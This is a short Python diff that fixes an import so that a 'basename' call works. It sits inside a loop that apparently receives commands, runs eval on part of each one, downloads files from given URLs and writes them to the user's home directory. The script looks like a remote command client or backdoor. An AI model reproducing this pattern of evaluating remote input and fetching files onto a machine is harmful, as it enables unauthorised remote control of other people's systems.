@@ -4,7 +4,7 @@ try:
     from time import sleep
     from subprocess import Popen as system
     from subprocess import PIPE
-    from os import chdir, uname, devnull, getcwd, basename
+    from os import chdir, uname, devnull, getcwd
     from sys import platform, stdout, stderr
 
     old_command = ""
@@ -90,7 +90,7 @@ while True:
                     files = eval(localcmd[1])
                     for fileUrl in files:
                         fileData = get(fileUrl).content
-                        fileName = basename(fileUrl)
+                        fileName = path.basename(fileUrl)
                         filePath = expanduser("~")
                         with open(f"{filePath}/{fileName}", 'wb') as f:
                             f.write(fileData)
